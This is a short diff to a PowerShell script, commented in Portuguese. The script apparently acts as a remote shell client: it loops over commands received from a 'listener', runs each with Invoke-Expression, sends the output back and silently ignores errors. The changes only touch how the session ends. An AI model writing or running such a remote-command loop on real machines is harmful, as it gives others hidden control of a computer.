@@ -43,8 +43,8 @@ while ($true) {
         if ([string]::IsNullOrWhiteSpace($command)) { continue }
 
         if ($command.Trim().ToLower() -eq "exit") {
-            $writer.WriteLine("PowerShell minimizado será encerrado pelo listener.")
-            break
+            $writer.WriteLine("PowerShell será encerrado pelo listener.")
+            exit
         }
 
         $output = Invoke-Expression $command 2>&1 | Out-String
@@ -78,13 +78,13 @@ try {
         }
     }
 } catch {
-    # ignora erros
+    # Se falhar, ignora
 }
 
 # -----------------------------
-# ENCERRA POWERSHELL AO DIGITAR exit
+# ENCERRA POWERSHELL AO FINAL
 # -----------------------------
-Stop-Process -Id $PID -Force
+exit
 
 
 
